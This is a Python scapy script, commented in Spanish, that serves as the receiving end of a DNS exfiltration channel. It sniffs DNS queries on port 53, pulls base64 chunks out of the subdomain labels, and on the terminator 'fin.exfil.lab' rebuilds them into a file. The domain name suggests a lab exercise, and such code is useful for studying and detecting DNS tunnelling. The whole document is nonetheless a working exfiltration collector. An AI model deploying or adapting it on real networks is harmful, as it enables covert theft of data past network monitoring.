from scapy.all import *
import base64
import re

capturados = {}

# Base64 URL-safe válido: letras, números, guiones y guiones bajos
BASE64_REGEX = re.compile(r'^[a-zA-Z0-9_-]+$')

def procesar_paquete(pkt):
    """Procesa cada consulta DNS"""
    if pkt.haslayer(DNSQR):
        query = pkt[DNSQR].qname.decode().strip('.')

        if query == "fin.exfil.lab":
            reconstruir_archivo()
            return

        try:
            partes = query.split(".")
            if len(partes) >= 2:
                chunk = partes[0]
                idx = int(partes[1])

                if not BASE64_REGEX.match(chunk):
                    print(f"[!] Chunk inválido ignorado: {chunk}")
                    return

                if idx not in capturados:
                    capturados[idx] = chunk
                    print(f"[+] Recibido chunk {idx}: {chunk}")
                else:
                    print(f"[~] Chunk duplicado ignorado: {idx}")
        except Exception as e:
            print(f"[!] Error procesando query '{query}': {e}")

def reconstruir_archivo():
    """Reconstruye el archivo cuando se recibe la señal de fin"""
    print("\n[*] Reconstruyendo archivo...")

    if not capturados:
        print("[!] No se recibieron datos.")
        return

    indices = sorted(capturados.keys())
    faltantes = [i for i in range(indices[0], indices[-1] + 1) if i not in capturados]

    if faltantes:
        print(f"[!] Faltan los siguientes chunks: {faltantes}")
        print("[X] Abortando reconstrucción.")
        return

    joined = ''.join(capturados[i] for i in indices)
    print(f"[DEBUG] Datos combinados (primeros 200 caracteres):\n{joined[:200]}{'...' if len(joined) > 200 else ''}")

    # Rellenar padding a múltiplo de 4
    padding = '=' * ((4 - len(joined) % 4) % 4)
    joined_padded = joined + padding

    try:
        decoded = base64.urlsafe_b64decode(joined_padded)
    except Exception as e:
        print(f"[ERROR] Falló la decodificación Base64: {e}")
        with open("fallo_base64.txt", "w") as f:
            f.write(joined_padded)
        print("[💾] Se guardó el string combinado en 'fallo_base64.txt' para análisis.")
        return

    with open("reconstruido.txt", "wb") as f:
        f.write(decoded)

    print("[✓] Archivo reconstruido exitosamente como 'reconstruido.txt'.")

def iniciar_servidor():
    """Inicia el servidor DNS"""
    print("[*] Escuchando tráfico DNS en el puerto 53 (requiere sudo/root)...")
    sniff(filter="udp port 53", prn=procesar_paquete, store=0)

if __name__ == "__main__":
    iniciar_servidor()
